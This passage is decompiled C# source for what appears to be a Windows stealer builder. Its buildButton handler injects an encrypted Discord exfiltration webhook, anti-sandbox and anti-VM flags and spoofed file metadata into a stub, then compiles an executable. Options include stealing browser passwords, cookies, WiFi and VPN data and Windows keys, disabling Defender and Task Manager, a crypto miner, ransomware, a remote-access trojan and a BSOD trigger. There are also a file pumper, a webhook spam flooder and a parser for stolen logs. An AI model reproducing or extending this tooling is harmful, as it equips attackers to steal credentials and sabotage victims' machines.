        this.ratButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.qrButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.shYes.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.shYes.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.shNo.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.shNo.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.btnUpdates.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.btnUpdates.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.fixButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.fixButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.englishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.englishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.russianButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.russianButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.frenchButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.frenchButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.polishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.polishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.spanishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.spanishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.turkishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.turkishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.germanButton.ForeColor = Color.Gainsboro;
        this.germanButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.germanButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.arabicButton.ForeColor = Color.Gainsboro;
        this.arabicButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.arabicButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.binderButton.ForeColor = Color.Gainsboro;
        this.binderButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.binderButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.button11.ForeColor = Color.Gainsboro;
        this.button11.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.button11.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.button9.ForeColor = Color.Gainsboro;
        this.button9.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.button9.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.button10.ForeColor = Color.Gainsboro;
        this.button10.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.button10.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.button12.ForeColor = Color.Gainsboro;
        this.button12.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.button12.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.button13.ForeColor = Color.Gainsboro;
        this.button13.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.button13.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.wizardBox.ForeColor = Color.Gainsboro;
        this.desBox.ForeColor = Color.Gainsboro;
        this.label55.ForeColor = Color.Gainsboro;
        this.label48.ForeColor = Color.Gainsboro;
        this.label49.ForeColor = Color.Gainsboro;
        this.label58.ForeColor = Color.Gainsboro;
        this.label59.ForeColor = Color.Gainsboro;
        this.label64.ForeColor = Color.Gainsboro;
        this.fakesButton.ForeColor = Color.Gainsboro;
        this.fakesButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.fakesButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.backButton.ForeColor = Color.Gainsboro;
        this.backButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.backButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.label69.ForeColor = Color.Gainsboro;
        this.sniffersBox.ForeColor = Color.Gainsboro;
        this.debugBox.ForeColor = Color.Gainsboro;
        this.vmBox.ForeColor = Color.Gainsboro;
        this.sandboxBox.ForeColor = Color.Gainsboro;
        this.emuBox.ForeColor = Color.Gainsboro;
    }

    private void shYes_Click(object sender, EventArgs e)
    {
        this.shNo.FlatAppearance.BorderSize = 0;
        this.shYes.FlatAppearance.BorderSize = 1;
        this.usernameLabel.Show();
        this.ynBtn = "yes";
    }

    private void shNo_Click(object sender, EventArgs e)
    {
        this.shNo.FlatAppearance.BorderSize = 1;
        this.shYes.FlatAppearance.BorderSize = 0;
        this.usernameLabel.Hide();
        this.ynBtn = "no";
    }

    private void PopupMessage(string message)
    {
        new notify(message).Show();
    }

    private void webhookCheck_Click(object sender, EventArgs e)
    {
        if (!string.IsNullOrEmpty(this.webhookBox.Text) && !string.IsNullOrWhiteSpace(this.webhookBox.Text))
        {
            WebClient webClient;
            webClient = new WebClient();
            try
            {
                webClient.DownloadString(this.webhookBox.Text);
                this.PopupMessage(this.whvalid);
                return;
            }
            catch
            {
                this.PopupMessage(this.whinvalid);
                return;
            }
        }
        this.PopupMessage(this.whcbe);
    }

    private void iconUpload_Click(object sender, EventArgs e)
    {
        try
        {
            OpenFileDialog openFileDialog;
            openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "Select icon";
            openFileDialog.Filter = "Icon (*.ico)|*.ico";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                this.iconBox.Image = new Bitmap(openFileDialog.FileName);
                this.label38.Text = openFileDialog.FileName;
            }
        }
        catch
        {
            this.PopupMessage(this.sthww);
        }
    }

    private void refreshLanguage()
    {
        this.redButton.Text = this.red;
        this.button1.Text = this.green;
        this.button2.Text = this.blue;
        this.button3.Text = this.white;
        this.label1.Text = this.lversion;
        this.label2.Text = this.uicolor;
        this.label3.Text = this.susername;
        this.label5.Text = this.cupdates;
        this.label7.Text = this.language;
        this.btnSettings.Text = this.settings;
        this.btnDashboard.Text = this.lmain;
        this.btnInventory.Text = this.additional;
        this.btnWork.Text = this.inspector;
        this.btnMap.Text = this.misc;
        this.btnParty.Text = this.lminer;
        this.shYes.Text = this.yes;
        this.shNo.Text = this.no;
        this.btnUpdates.Text = this.check;
        this.webhookCheck.Text = this.check;
        this.iconUpload.Text = this.upload;
        this.label6.Text = this.licon;
        this.buildButton.Text = this.build;
        this.cloneButton.Text = this.clone;
        this.generateButton.Text = this.generate;
        this.label8.Text = this.fInfo;
        this.fileinfoLabel.Text = this.none;
        this.dAIOupload.Text = this.upload;
        this.label16.Text = this.exportas;
        this.exportCredentials.Text = this.credentials;
        this.label10.Text = this.dName;
        this.label11.Text = this.dIP;
        this.label12.Text = this.dMAC;
        this.label13.Text = this.dToken;
        this.label15.Text = this.dWin;
        this.label9.Text = this.embedcolor;
        this.colorSelect.Text = this.select;
        this.buildingLabel.Text = this.idle;
        this.button4.Text = this.check;
        this.tokenChecker.Text = this.check;
        this.flooderEmSelect.Text = this.select;
        this.button5.Text = this.start;
        this.button6.Text = this.stopped;
        this.wdeleteButton.Text = this.delete;
        this.button8.Text = this.delete;
        this.pumpButton.Text = this.pump;
        this.label28.Text = this.filepumper;
        this.label23.Text = this.lusername;
        this.label24.Text = this.lmessage;
        this.label27.Text = this.floodercolor;
        this.label26.Text = this.whflooder;
        this.label25.Text = this.deletewh;
        this.label36.Text = this.deletetkn;
        this.safeBox.Text = this.safemode;
        this.tNameLabel.Text = this.none;
        this.tEmailLabel.Text = this.none;
        this.tPhoneLabel.Text = this.none;
        this.tIDLabel.Text = this.none;
        this.tMFALabel.Text = this.none;
        this.tVLabel.Text = this.none;
        this.label21.Text = this.lmessage;
        this.label17.Text = this.addsettings;
        this.label18.Text = this.fakeerror;
        this.label20.Text = this.ltitle;
        this.label19.Text = this.customplugin;
        this.errorBox.Text = this.fakeerror;
        this.pluginBox.Text = this.customplugin;
        this.obfuscateBox.Text = this.lobfuscate;
        this.startupBox.Text = this.rostart;
        this.defenderBox.Text = this.disabledefender;
        this.taskmanagerBox.Text = this.disablemanager;
        this.bsodBox.Text = this.lbsod;
        this.blockerBox.Text = this.wbblocker;
        this.hidesBox.Text = this.lhide;
        this.jumpscareBox.Text = this.ljumpscare;
        this.inputdBox.Text = this.disableinput;
        this.sbrpassBox.Text = this.spasswords;
        this.swinkeyBox.Text = this.swindowskey;
        this.sbrCookiesBox.Text = this.scookies;
        this.sVpnBox.Text = this.svpnc;
        this.swifiBox.Text = this.wifidata;
        this.dinternetBox.Text = this.disableinternet;
        this.sbrhisBox.Text = this.shistory;
        this.cryptoBox.Text = this.cminer;
        this.ransomBox.Text = this.lransomware;
        this.label54.Text = this.lusername;
        this.label57.Text = this.mpool;
        this.label53.Text = this.lpassword;
        this.label37.Text = this.lusage;
        this.label52.Text = this.minerInstruction;
        this.label41.Text = this.instruction2;
        this.label40.Text = this.lrequire;
        this.pipBox.Text = this.pipinstall;
        this.ratInstallButton.Text = this.linstall;
        this.label43.Text = this.linstertt;
        this.insertButton.Text = this.linsert;
        this.label45.Text = this.compilerat;
        this.ratCompileButton.Text = this.compile;
        this.saveButton.Text = this.saveB;
    }

    private void englishButton_Click(object sender, EventArgs e)
    {
        this.englishButton.FlatAppearance.BorderSize = 1;
        this.russianButton.FlatAppearance.BorderSize = 0;
        this.frenchButton.FlatAppearance.BorderSize = 0;
        this.polishButton.FlatAppearance.BorderSize = 0;
        this.spanishButton.FlatAppearance.BorderSize = 0;
        this.turkishButton.FlatAppearance.BorderSize = 0;
        this.germanButton.FlatAppearance.BorderSize = 0;
        this.arabicButton.FlatAppearance.BorderSize = 0;
        this.translateLabel.Text = "null";
        this.translateLabel.ForeColor = Color.FromArgb(5, 5, 5);
        this.sthww = "Something went wrong.";
        this.red = "Red";
        this.green = "Green";
        this.blue = "Blue";
        this.white = "White";
        this.lversion = "Version:";
        this.uicolor = "UI Color:";
        this.susername = "Show username:";
        this.cupdates = "Check-updates:";
        this.language = "Language:";
        this.settings = "Settings";
        this.lmain = "Main";
        this.additional = "Additional";
        this.inspector = "Inspector";
        this.misc = "Misc";
        this.yes = "Yes";
        this.no = "No";
        this.check = "Check";
        this.upload = "Upload";
        this.licon = "Icon";
        this.build = "Build";
        this.clone = "Clone";
        this.generate = "Generate";
        this.fInfo = "Metadata:";
        this.none = "None";
        this.whcbe = "Webhook cannot be empty!";
        this.whvalid = "Webhook valid.";
        this.whinvalid = "Invalid webhook.";
        this.generateorclone = "You need to generate or clone metadata.";
        this.pumpinfo = "You need to provide size of the output file!";
        this.selectpumpsize = "You need to select the size of pump.";
        this.pumpedTo = "File pumped to ";
        this.whdeleted = "Webhook deleted.";
        this.whfstop = "Webhook flooder stopped.";
        this.whusmsempty = "Webhook, name and message cannot be empty!";
        this.toomany = "Too many requests.\nSpam delayed.";
        this.start = "Start";
        this.stop = "Stop";
        this.started = "Started";
        this.stopped = "Stopped";
        this.cpuusage = "Select CPU usage.";
        this.poolusrname = "Provide pool, username and password.";
        this.compdone = "Compilation done.";
        this.addcreated = "Additional options created. Compiling...";
        this.savedas = "Saved as ";
        this.creatingadds = "Creating additional options...";
        this.creatingfile = "Creating file...";
        this.openingexp = "Opening explorer...";
        this.tokencannotempt = "Token cannot be empty!";
        this.invalidtoken = "Invalid token.";
        this.tokendeleted = "Token deleted.";
        this.disabled = "Disabled";
        this.enabled = "Enabled";
        this.unverified = "Unverified";
        this.verified = "Verified";
        this.nopass = "No passwords!";
        this.nocookies = "No cookies!";
        this.nohistory = "No history!";
        this.novpn = "No VPN!";
        this.nowifinetwork = "No WiFi Network data!";
        this.nowifipass = "No WiFi passwords";
        this.lminer = "Miner";
        this.filecreated = "File created. Please wait...";
        this.exportas = "Export (as .txt)";
        this.credentials = "Credentials";
        this.dName = "Name:";
        this.dIP = "IP Address:";
        this.dMAC = "MAC Address:";
        this.dToken = "DC Token:";
        this.dWin = "WIN Key:";
        this.embedcolor = "Embed color";
        this.select = "Select";
        this.idle = "Idle...";
        this.delete = "Delete";
        this.pump = "Pump";
        this.filepumper = "File pumper";
        this.lusername = "Username";
        this.lmessage = "Message";
        this.floodercolor = "Flooder embed color";
        this.whflooder = "Webhook flooder";
        this.deletewh = "Delete webhook";
        this.deletetkn = "Delete token";
        this.safemode = "Safe mode";
        this.addsettings = "Additional settings";
        this.fakeerror = "Fake error";
        this.ltitle = "Title";
        this.customplugin = "Custom plugin";
        this.lobfuscate = "Obfuscate";
        this.rostart = "Run on startup";
        this.disabledefender = "Disable Windows Defender";
        this.disablemanager = "Disable Task Manager";
        this.lbsod = "Blue Screen";
        this.wbblocker = "Website blocker";
        this.lhide = "Hide stealer";
        this.ljumpscare = "Jumpscare";
        this.disableinput = "Disable mouse and keyboard";
        this.swindowskey = "Steal windows key";
        this.spasswords = "Steal browser passwords";
        this.scookies = "Steal browser cookies";
        this.svpnc = "Steal VPN";
        this.wifidata = "Steal WiFi data";
        this.disableinternet = "Disable internet";
        this.shistory = "Steal browser history";
        this.cminer = "Crypto miner";
        this.lransomware = "Ransomware";
        this.mpool = "Monero pool";
        this.lpassword = "Password";
        this.lusage = "CPU usage";
        this.minerInstruction = "1. Setup your pool (ex. pool.minergate.com:443)\n2. Setup your username. If you're using minergate fill in your email address.\n3. To setup workers' name change password variable.";
        this.lrequire = "Requirements installation";
        this.linstertt = "Insert token";
        this.linstall = "Install";
        this.pipinstall = "PIP installed";
        this.compile = "Compile";
        this.compilerat = "Compile RAT";
        this.linsert = "Insert";
        this.instruction2 = "1. Create discord bot, add it to your server (with administrator privileges).\n2. Install python3.\n3. Click install button.\n4. Insert discord bot token and press Insert button.\n5. Click compile rat button.\n6. Upload compiled rat to website/discord.\n7. Provide url of compiled rat into.\n8. Check Discord RAT in additional page.\n\nCommands are on our discord server.\nIf you cannot compile RAT, uninstall enum34 package with <py -m pip uninstall enum34>";
        this.saveB = "Save";
        this.refreshLanguage();
    }

    private void cloneButton_Click(object sender, EventArgs e)
    {
        try
        {
            string title;
            title = "null";
            string text;
            text = "null";
            string product;
            product = "null";
            string company;
            company = "null";
            string copyright;
            copyright = "null";
            string trademark;
            trademark = "null";
            string majorVersion;
            majorVersion = "null";
            string minorVersion;
            minorVersion = "null";
            string buildPart;
            buildPart = "null";
            string privatePart;
            privatePart = "null";
            OpenFileDialog openFileDialog;
            openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Executable (*.exe)|*.exe";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                FileVersionInfo versionInfo;
                versionInfo = FileVersionInfo.GetVersionInfo(Path.GetFullPath(openFileDialog.FileName));
                title = versionInfo.OriginalFilename;
                text = versionInfo.FileDescription;
                product = versionInfo.ProductName;
                company = versionInfo.CompanyName;
                copyright = versionInfo.LegalCopyright;
                trademark = versionInfo.LegalTrademarks;
                majorVersion = versionInfo.FileMajorPart.ToString();
                minorVersion = versionInfo.FileMinorPart.ToString();
                buildPart = versionInfo.FileBuildPart.ToString();
                privatePart = versionInfo.FileBuildPart.ToString();
            }
            if (text == "")
            {
                this.fileinfoLabel.Text = product;
            }
            else
            {
                this.fileinfoLabel.Text = text;
            }
            this.Title = title;
            this.Description = text;
            this.Product = product;
            this.Company = company;
            this.Copyright = copyright;
            this.Trademark = trademark;
            this.MajorVersion = majorVersion;
            this.MinorVersion = minorVersion;
            this.BuildPart = buildPart;
            this.PrivatePart = privatePart;
        }
        catch
        {
            this.PopupMessage(this.sthww);
        }
    }

    private void generateButton_Click(object sender, EventArgs e)
    {
        FileInfo randomFileInfo;
        randomFileInfo = this.randomFileInfo_0.getRandomFileInfo();
        this.Title = randomFileInfo.Title;
        this.Description = randomFileInfo.Description;
        this.Product = randomFileInfo.Product;
        this.Company = randomFileInfo.Company;
        this.Copyright = randomFileInfo.Copyright;
        this.Trademark = randomFileInfo.Trademark;
        this.MajorVersion = randomFileInfo.MajorVersion;
        this.MinorVersion = randomFileInfo.MinorVersion;
        this.BuildPart = randomFileInfo.BuildPart;
        this.PrivatePart = randomFileInfo.PrivatePart;
        this.fileinfoLabel.Text = this.Description;
    }

    private void colorSelect_Click(object sender, EventArgs e)
    {
        ColorDialog colorDialog;
        colorDialog = new ColorDialog();
        if (colorDialog.ShowDialog() == DialogResult.OK)
        {
            this.embedBox.BackColor = Color.FromArgb(colorDialog.Color.A, colorDialog.Color.R, colorDialog.Color.G, colorDialog.Color.B);
        }
    }

    private void buildButton_Click(object sender, EventArgs e)
    {
        FileInfo randomFileInfo;
        randomFileInfo = this.randomFileInfo_0.getRandomFileInfo();
        this.Title = randomFileInfo.Title;
        this.Description = randomFileInfo.Description;
        this.Product = randomFileInfo.Product;
        this.Company = randomFileInfo.Company;
        this.Copyright = randomFileInfo.Copyright;
        this.Trademark = randomFileInfo.Trademark;
        this.MajorVersion = randomFileInfo.MajorVersion;
        this.MinorVersion = randomFileInfo.MinorVersion;
        this.BuildPart = randomFileInfo.BuildPart;
        this.PrivatePart = randomFileInfo.PrivatePart;
        this.fileinfoLabel.Text = this.Description;
        if (this.fileinfoLabel.Text == this.none)
        {
            this.PopupMessage(this.generateorclone);
            return;
        }
        this.buildingLabel.Text = this.openingexp;
        try
        {
            using SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "Executable (*.exe)|*.exe";
            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                this.buildingLabel.Text = this.creatingfile;
                string newValue;
                newValue = GForm0.Encrypt(this.webhookBox.Text);
                string text;
                text = Resources.stub.Replace("ANHOwebhook", newValue);
                text = ((!this.sniffersBox.Checked) ? text.Replace("%sniffersyesno%", "false") : text.Replace("%sniffersyesno%", "true"));
                text = ((!this.debugBox.Checked) ? text.Replace("%debugyesno%", "false") : text.Replace("%debugyesno%", "true"));
                text = ((!this.vmBox.Checked) ? text.Replace("%vmyesno%", "false") : text.Replace("%vmyesno%", "true"));
                text = ((!this.sandboxBox.Checked) ? text.Replace("%sandboxyesno%", "false") : text.Replace("%sandboxyesno%", "true"));
                text = ((!this.emuBox.Checked) ? text.Replace("%emuyesno%", "false") : text.Replace("%emuyesno%", "true")).Replace("%Title%", this.Title).Replace("%Description%", this.Description).Replace("%Product%", this.Product)
                    .Replace("%Company%", this.Company)
                    .Replace("%Copyright%", this.Copyright)
                    .Replace("%Trademark%", this.Trademark)
                    .Replace("%v1%", this.MajorVersion)
                    .Replace("%v2%", this.MinorVersion)
                    .Replace("%v3%", this.BuildPart)
                    .Replace("%v4%", this.PrivatePart)
                    .Replace("%Guid%", Guid.NewGuid().ToString());
                this.buildingLabel.Text = this.filecreated;
                string newValue2;
                newValue2 = this.embedBox.BackColor.ToArgb().ToString().Remove(0, 1);
                Thread.Sleep(1000);
                this.buildingLabel.Text = this.creatingadds;
                text = text.Replace("%selectedColor%", newValue2);
                if (this.startupBox.Checked)
                {
                    text = text.Replace("//startupaio", "Startup();");
                }
                if (this.hidesBox.Checked)
                {
                    text.Replace("//hideme", "HideFile();");
                }
                if (this.errorBox.Checked)
                {
                    text = text.Replace("//errorhere", "Error();").Replace("titleError", this.faketitleBox.Text).Replace("messageError", this.fakeMessageBox.Text);
                }
                if (this.bsodBox.Checked)
                {
                    text = text.Replace("//bsodlmao", "BSOD();");
                }
                if (this.taskmanagerBox.Checked)
                {
                    text = text.Replace("//killctrlaltdel", "KillTM();");
                }
                if (this.defenderBox.Checked)
                {
                    text = text.Replace("//killdefender", "Defender.KillDefender();");
                }
                if (this.inputdBox.Checked)
                {
                    text = text.Replace("//killinput", "BlockInput();");
                }
                if (this.blockerBox.Checked)
                {
                    text = text.Replace("//killweb", "KillWebsites();");
                }
                if (this.dinternetBox.Checked)
                {
                    text = text.Replace("//killinternet", "KillWIFI();");
                }
                if (this.ratBox.Checked)
                {
                    text = text.Replace("//ratoverhere", "RunRAT();").Replace("%raturlrightthere%", this.rURLBox.Text);
                }
                if (this.jumpscareBox.Checked)
                {
                    text = text.Replace("//jumpscare", "Jumpscare();");
                }
                if (this.pluginBox.Checked)
                {
                    text = text.Replace("//custom", "CustomPlugin();").Replace("//%customcodehere%", this.pluginSource.Text);
                }
                if (this.swinkeyBox.Checked)
                {
                    text = text.Replace("//winkey", "WinProductKey();");
                }
                if (this.sbrpassBox.Checked)
                {
                    text = text.Replace("//stealpasses", "Chrome.RunPass();");
                }
                if (this.sbrCookiesBox.Checked)
                {
                    text = text.Replace("//stealcookies", "Chrome.RunCookies();");
                }
                if (this.sbrhisBox.Checked)
                {
                    text = text.Replace("//stealhistory", "Chrome.RunHis();");
                }
                if (this.swifiBox.Checked)
                {
                    text = text.Replace("//stealwifi", "StealWIFI();");
                }
                if (this.sVpnBox.Checked)
                {
                    text = text.Replace("//stealnord", "NordVPN.Save();");
                }
                if (this.nitroBox.Checked)
                {
                    text = text.Replace("//ourcoolfakenitrogen", "RunFAKENitroGEN();");
                }
                if (this.cmdBox.Checked)
                {
                    text = text.Replace("//ourcoolfakecmd", "RunFAKEcmd();");
                }
                if (this.wizardBox.Checked)
                {
                    text = text.Replace("//ourcoolfakesetup", "RunWizard();");
                }
                if (this.desBox.Checked)
                {
                    text = text.Replace("//fakedesexe", "RunDesudo();");
                }
                text = ((!GForm0.ifExe1) ? text.Replace("%otutajembedone%", "false") : text.Replace("%otutajembedone%", "true"));
                text = ((!GForm0.ifExe2) ? text.Replace("%otutajembedtwo%", "false") : text.Replace("%otutajembedtwo%", "true"));
                text = ((!GForm0.ifExe3) ? text.Replace("%otutajembedthree%", "false") : text.Replace("%otutajembedthree%", "true"));
                text = ((!GForm0.ifExe4) ? text.Replace("%otutajembedfour%", "false") : text.Replace("%otutajembedfour%", "true"));
                text = ((!GForm0.ifExe5) ? text.Replace("%otutajembedfive%", "false") : text.Replace("%otutajembedfive%", "true"));
                _ = this.ransomBox.Checked;
                bool obfuscateMe;
                obfuscateMe = false;
                if (this.obfuscateBox.Checked)
                {
                    obfuscateMe = true;
                }
                this.buildingLabel.Text = this.addcreated;
                Thread.Sleep(500);
                if (Compiler.Compilation(text, saveFileDialog.FileName, obfuscateMe, string.IsNullOrWhiteSpace(this.label38.Text) ? null : this.label38.Text, GForm0.ifExe1, GForm0.ifExe2, GForm0.ifExe3, GForm0.ifExe4, GForm0.ifExe5, GForm0.exe1, GForm0.exe2, GForm0.exe3, GForm0.exe4, GForm0.exe5))
                {
                    this.buildingLabel.Text = this.savedas + saveFileDialog.FileName;
                    this.PopupMessage(this.compdone);
                }
            }
        }
        catch (Exception ex)
        {
            this.PopupMessage(ex.ToString());
        }
    }

    private void dAIOupload_Click(object sender, EventArgs e)
    {
        string text;
        text = "N/A";
        string text2;
        text2 = "N/A";
        string text3;
        text3 = "N/A";
        string text4;
        text4 = "N/A";
        string text5;
        text5 = "N/A";
        try
        {
            using OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "ssh (*.ssh)|*.ssh";
            if (openFileDialog.ShowDialog() != DialogResult.OK)
            {
                return;
            }
            string text6;
            text6 = File.ReadAllText(openFileDialog.FileName);
            string directoryName;
            directoryName = Path.GetDirectoryName(openFileDialog.FileName);
            this.dAIObox.Text = directoryName;
            text = GForm0.getBetween(text6, "IP Address: ", " |");
            text2 = GForm0.getBetween(text6, "Desktop name: ", " |");
            text4 = GForm0.getBetween(text6, "MAC Address: ", " |");
            string[] array;
            array = File.ReadAllLines(openFileDialog.FileName);
            for (int i = 0; i < array.Length; i++)
            {
                if (array[i].Contains("# End of Tokens") && i >= 2)
                {
                    text3 = array[i - 2];
                }
            }
            if (text6.Contains("# Windows"))
            {
                text5 = GForm0.getBetween(text6, "Key: ", " |");
            }
            this.nameBox.Text = text2;
            this.ipBox.Text = text;
            this.tokenBox.Text = text3;
            this.macBox.Text = text4;
            this.winBox.Text = text5;
        }
        catch
        {
        }
    }

    private void pumpButton_Click(object sender, EventArgs e)
    {
        if (!string.IsNullOrEmpty(this.pumpBox.Text) && !string.IsNullOrWhiteSpace(this.pumpBox.Text))
        {
            OpenFileDialog openFileDialog;
            openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Executable (*.exe)|*.exe";
            openFileDialog.Title = "Select file to pump";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                this.pumpPathBox.Text = openFileDialog.FileName;
                new Thread(PumpingFile).Start();
            }
        }
        else
        {
            this.PopupMessage(this.pumpinfo);
        }
    }

    private void PumpingFile()
    {
        try
        {
            FileStream fileStream;
            fileStream = File.OpenWrite(this.pumpPathBox.Text);
            long num;
            num = fileStream.Seek(0L, SeekOrigin.End);
            long num2;
            num2 = Convert.ToInt64(this.pumpBox.Text);
            if (this.kbBox.Checked)
            {
                decimal num3;
                num3 = num2 * 1024L;
                while ((decimal)num < num3)
                {
                    num++;
                    fileStream.WriteByte(0);
                }
                fileStream.Close();
                this.PopupMessage(this.pumpedTo + num2 + "KB");
            }
            else if (this.mbBox.Checked)
            {
                decimal num4;
                num4 = num2 * 1024L * 1024L;
                while ((decimal)num < num4)
                {
                    num++;
                    fileStream.WriteByte(0);
                }
                fileStream.Close();
                this.PopupMessage(this.pumpedTo + num2 + "MB");
            }
            else if (this.gbBox.Checked)
            {
                decimal num5;
                num5 = num2 * 1024L * 1024L * 1024L;
                while ((decimal)num < num5)
                {
                    num++;
                    fileStream.WriteByte(0);
                }
                fileStream.Close();
                this.PopupMessage(this.pumpedTo + num2 + "GB");
            }
            else
            {
                this.PopupMessage(this.selectpumpsize);
            }
        }
        catch
        {
            this.PopupMessage(this.sthww);
        }
    }

    private void kbBox_CheckedChanged(object sender, EventArgs e)
    {
        if (this.kbBox.Checked)
        {
            this.mbBox.Checked = false;
            this.gbBox.Checked = false;
        }
    }

    private void mbBox_CheckedChanged(object sender, EventArgs e)
    {
        if (this.mbBox.Checked)
        {
            this.kbBox.Checked = false;
            this.gbBox.Checked = false;
        }
    }

    private void gbBox_CheckedChanged(object sender, EventArgs e)
    {
        if (this.gbBox.Checked)
        {
            this.mbBox.Checked = false;
            this.kbBox.Checked = false;
        }
    }

    private void button4_Click(object sender, EventArgs e)
    {
        if (!string.IsNullOrEmpty(this.miscWebhookBox.Text) && !string.IsNullOrWhiteSpace(this.miscWebhookBox.Text))
        {
            WebClient webClient;
            webClient = new WebClient();
            try
            {
                webClient.DownloadString(this.miscWebhookBox.Text);
                this.PopupMessage(this.whvalid);
                return;
            }
            catch
            {
                this.PopupMessage(this.whinvalid);
                return;
            }
        }
        this.PopupMessage(this.whcbe);
    }

    private void wdeleteButton_Click(object sender, EventArgs e)
    {
        if (!string.IsNullOrEmpty(this.miscWebhookBox.Text) && !string.IsNullOrWhiteSpace(this.miscWebhookBox.Text))
        {
            try
            {
                new HttpRequest().Delete(this.miscWebhookBox.Text).ToString();
                this.PopupMessage(this.whdeleted);
                return;
            }
            catch
            {
                this.PopupMessage(this.whinvalid);
                return;
            }
        }
        this.PopupMessage(this.whcbe);
    }

    private void button6_Click(object sender, EventArgs e)
    {
        this.webhookSwitch = false;
        this.webHandler = false;
        this.PopupMessage(this.whfstop);
        this.button6.Text = this.stopped;
        this.button5.Text = this.start;
    }

    private void button5_Click(object sender, EventArgs e)
    {
        if (!string.IsNullOrEmpty(this.webhookBox.Text) && !string.IsNullOrWhiteSpace(this.webhookBox.Text) && !string.IsNullOrEmpty(this.userBox.Text) && !string.IsNullOrWhiteSpace(this.userBox.Text) && !string.IsNullOrEmpty(this.textBox2.Text) && !string.IsNullOrWhiteSpace(this.textBox2.Text))
        {
            string SPAMwebhook;
            SPAMwebhook = this.webhookBox.Text;
            string SPAMname;
            SPAMname = this.userBox.Text;
            string SPAMmessage;
            SPAMmessage = this.textBox2.Text;
            this.flooderEmbed.BackColor.ToArgb().ToString().Remove(0, 1);
            this.webhookSwitch = true;
            this.button6.Text = this.stop;
            this.button5.Text = this.started;
            if (this.safeBox.Checked)
            {
                new Thread((ThreadStart)delegate
                {
                    while (this.webhookSwitch)
                    {
                        try
                        {
                            using HttpRequest httpRequest2 = new HttpRequest();
                            httpRequest2.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"avatar_url\":\"https://i.imgur.com/orjerBH.png\"" + SPAMmessage + "\"}}]}", "application/json").ToString();
                            Thread.Sleep(2000);
                        }
                        catch
                        {
                            if (!this.webHandler)
                            {
                                this.webhookSwitch = false;
                                Thread.Sleep(3000);
                                this.webhookSwitch = true;
                            }
                        }
                    }
                }).Start();
                return;
            }
            new Thread((ThreadStart)delegate
            {
                while (this.webhookSwitch)
                {
                    try
                    {
                        using HttpRequest httpRequest = new HttpRequest();
                        httpRequest.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"avatar_url\":\"https://i.imgur.com/orjerBH.png\"}}]}", "application/json").ToString();
                        Thread.Sleep(350000000);
                    }
                    catch
                    {
                        if (!this.webHandler)
                        {
                            this.webhookSwitch = false;
                            Thread.Sleep(500);
                            this.webhookSwitch = true;
                        }
                    }
                }
            }).Start();
        }
        else
        {
            this.PopupMessage(this.whusmsempty);
        }
    }

    private void flooderEmSelect_Click(object sender, EventArgs e)
    {
        ColorDialog colorDialog;
        colorDialog = new ColorDialog();
        if (colorDialog.ShowDialog() == DialogResult.OK)
        {
